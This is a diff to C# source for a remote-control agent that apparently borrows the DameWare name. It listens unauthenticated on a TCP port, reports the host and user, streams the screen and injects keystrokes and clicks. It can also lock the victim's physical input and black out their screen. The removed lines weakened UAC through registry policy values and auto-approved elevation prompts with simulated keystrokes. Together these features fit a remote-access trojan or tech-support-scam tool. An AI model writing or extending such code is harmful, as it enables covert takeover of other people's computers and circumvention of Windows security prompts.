@@ -9,7 +9,6 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
-using Microsoft.Win32;
 
 namespace DameWareNativeAgent
 {
@@ -27,9 +26,6 @@ namespace DameWareNativeAgent
         [DllImport("user32.dll")]
         public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
 
-        [DllImport("user32.dll", SetLastError = true)]
-        public static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);
-
         [DllImport("user32.dll")]
         public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
 
@@ -39,51 +35,30 @@ namespace DameWareNativeAgent
         [DllImport("user32.dll")]
         public static extern bool BlockInput(bool fBlockIt);
 
-        [StructLayout(LayoutKind.Sequential)]
-        public struct INPUT
-        {
-            public uint type;
-            public MOUSEINPUT mi;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct MOUSEINPUT
-        {
-            public int dx;
-            public int dy;
-            public uint mouseData;
-            public uint dwFlags;
-            public uint time;
-            public IntPtr dwExtraInfo;
-        }
-
-        public const uint INPUT_MOUSE = 0;
+        // MOUSE CONSTANTS
+        public const uint MOUSEEVENTF_MOVE = 0x0001;
         public const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
         public const uint MOUSEEVENTF_LEFTUP = 0x0004;
         public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
         public const uint MOUSEEVENTF_RIGHTUP = 0x0010;
 
+        // KEYBOARD CONSTANTS
         public const byte VK_CONTROL = 0x11;
-        public const byte VK_MENU = 0x12;
+        public const byte VK_MENU = 0x12; // ALT key
         public const byte VK_DELETE = 0x2E;
-        public const byte VK_LWIN = 0x5B;
+        public const byte VK_LWIN = 0x5B;  // Left Windows Key
         public const byte VK_TAB = 0x09;
-        public const byte VK_SNAPSHOT = 0x2C;
+        public const byte VK_SNAPSHOT = 0x2C; // PrintScreen
         public const byte VK_L = 0x4C;
-        public const byte VK_LEFT = 0x25;
-        public const byte VK_RIGHT = 0x27;
-        public const byte VK_RETURN = 0x0D;
         public const uint KEYEVENTF_KEYUP = 0x0002;
 
         static void Main(string[] args)
         {
-            Console.Title = "DameWare Agent v12.2 (Keyboard UAC Approval & Ultra Fast)";
+            Console.Title = "DameWare Mini Remote Control Agent v12.2 (Full Remote Typing Active)";
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine("==========================================================");
-            Console.WriteLine(" DameWare Agent Service - Keyboard & Mouse UAC Active");
+            Console.WriteLine(" DameWare Agent Service - Full Remote Typing Active");
             Console.WriteLine("==========================================================");
-
-            EnableUACDesktopRegistry();
 
             TcpListener listener = new TcpListener(IPAddress.Any, PORT);
             try {
@@ -105,45 +80,17 @@ namespace DameWareNativeAgent
             }
         }
 
-        private static void EnableUACDesktopRegistry()
-        {
-            try {
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")) {
-                    if (key != null) {
-                        key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
-                        key.SetValue("EnableUIADesktopToggle", 1, RegistryValueKind.DWord);
-                        key.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
-                    }
-                }
-            } catch {}
-        }
-
-        private static void SendMouseClickSendInput(uint downFlag, uint upFlag)
-        {
-            try {
-                INPUT[] inputs = new INPUT[2];
-                inputs[0].type = INPUT_MOUSE;
-                inputs[0].mi.dwFlags = downFlag;
-
-                inputs[1].type = INPUT_MOUSE;
-                inputs[1].mi.dwFlags = upFlag;
-
-                SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
-            } catch {
-                mouse_event(downFlag, 0, 0, 0, 0);
-                mouse_event(upFlag, 0, 0, 0, 0);
-            }
-        }
-
         private static void HandleClient(object obj)
         {
             TcpClient client = (TcpClient)obj;
             NetworkStream stream = client.GetStream();
 
+            // Send Handshake
             string handshake = string.Format("{{\"type\":\"HANDSHAKE_ACK\",\"agentVersion\":\"DameWare Native v12.2\",\"hostname\":\"{0}\",\"user\":\"{1}\",\"os\":\"Windows {2}\"}}\n", Environment.MachineName, Environment.UserName, Environment.OSVersion);
             byte[] handshakeBytes = Encoding.UTF8.GetBytes(handshake);
             stream.Write(handshakeBytes, 0, handshakeBytes.Length);
 
+            // Frame Streaming Thread (20 FPS)
             Thread streamThread = new Thread(() => {
                 try {
                     while (client.Connected) {
@@ -159,13 +106,14 @@ namespace DameWareNativeAgent
                                 stream.Write(packetBytes, 0, packetBytes.Length);
                             }
                         }
-                        Thread.Sleep(33);
+                        Thread.Sleep(50); // 20 FPS
                     }
                 } catch {}
             });
             streamThread.IsBackground = true;
             streamThread.Start();
 
+            // Command Processing Loop
             byte[] buffer = new byte[16384];
             try {
                 int bytesRead;
@@ -180,6 +128,7 @@ namespace DameWareNativeAgent
                 }
             } catch {}
 
+            Console.WriteLine("[-] Console disconnected.");
             client.Close();
         }
 
@@ -203,16 +152,18 @@ namespace DameWareNativeAgent
                     SetCursorPos(targetX, targetY);
 
                     if (action == "mousedown") {
-                        if (button == "right") SendMouseClickSendInput(MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP);
-                        else SendMouseClickSendInput(MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP);
+                        if (button == "right") mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
+                        else mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                     } else if (action == "mouseup") {
-                        if (button == "right") SendMouseClickSendInput(MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP);
-                        else SendMouseClickSendInput(MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP);
+                        if (button == "right") mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
+                        else mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                     } else if (action == "click") {
                         if (button == "right") {
-                            SendMouseClickSendInput(MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP);
+                            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
+                            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                         } else {
-                            SendMouseClickSendInput(MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP);
+                            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+                            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                         }
                     }
 
@@ -227,6 +178,7 @@ namespace DameWareNativeAgent
                         try { BlockInput(false); } catch {}
                     }
 
+                    // 1. SPECIAL SHORTCUTS
                     if (key == "CAD") {
                         keybd_event(VK_CONTROL, 0, 0, 0);
                         keybd_event(VK_MENU, 0, 0, 0);
@@ -261,24 +213,12 @@ namespace DameWareNativeAgent
                         Thread.Sleep(50);
                         keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
                     }
-                    else if (key == "UAC_YES") {
-                        // Alt + E (Direct Windows Hotkey for UAC YES / EVET)
-                        keybd_event(VK_MENU, 0, 0, 0);
-                        keybd_event(0x45, 0, 0, 0); // 'E' key
-                        Thread.Sleep(50);
-                        keybd_event(0x45, 0, KEYEVENTF_KEYUP, 0);
-                        keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
-
-                        // Fallback Left Arrow + Enter
-                        keybd_event(VK_LEFT, 0, 0, 0);
-                        keybd_event(VK_LEFT, 0, KEYEVENTF_KEYUP, 0);
-                        keybd_event(VK_RETURN, 0, 0, 0);
-                        keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
-                    }
+                    // 2. STANDARD REAL-TIME KEYBOARD TYPING
                     else if (!string.IsNullOrEmpty(key)) {
                         try {
                             SendKeys.SendWait(key);
                         } catch {
+                            // Fallback for special characters that SendKeys escapes
                             string escapedKey = EscapeSendKeys(key);
                             try { SendKeys.SendWait(escapedKey); } catch {}
                         }
@@ -291,9 +231,11 @@ namespace DameWareNativeAgent
                 else if (cmd.Contains("LOCK_INPUT")) {
                     isInputLocked = cmd.Contains("\"locked\":true");
                     try { BlockInput(isInputLocked); } catch {}
+                    Console.WriteLine("[*] Remote physical input lock state: " + isInputLocked);
                 } 
                 else if (cmd.Contains("BLACKOUT_SCREEN")) {
                     isScreenBlackedOut = cmd.Contains("\"blackout\":true");
+                    Console.WriteLine("[*] Remote screen blackout state: " + isScreenBlackedOut);
                 } 
                 else if (cmd.Contains("POWER_ACTION")) {
                     string action = GetJsonString(cmd, "action");
